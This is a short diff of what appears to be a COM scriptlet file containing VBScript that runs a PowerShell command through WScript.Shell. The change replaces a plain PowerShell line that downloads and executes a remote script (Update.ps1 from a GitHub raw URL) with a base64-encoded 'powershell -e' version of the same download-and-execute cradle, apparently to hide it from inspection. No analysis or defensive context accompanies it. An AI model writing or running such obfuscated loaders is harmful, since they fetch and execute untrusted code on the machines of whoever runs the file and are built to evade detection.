@@ -6,7 +6,7 @@ classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 <script language="VBScript">
 <![CDATA[
 Dim r
-r = "IEX (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/frknozr/myTests/master/Update.ps1')" 
+r = "powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZgByAGsAbgBvAHoAcgAvAG0AeQBUAGUAcwB0AHMALwBtAGEAcwB0AGUAcgAvAFUAcABkAGEAdABlAC4AcABzADEAJwApAA=="
 Set oShell = CreateObject ("WScript.Shell")
 oShell.exec(r)
 ]]>
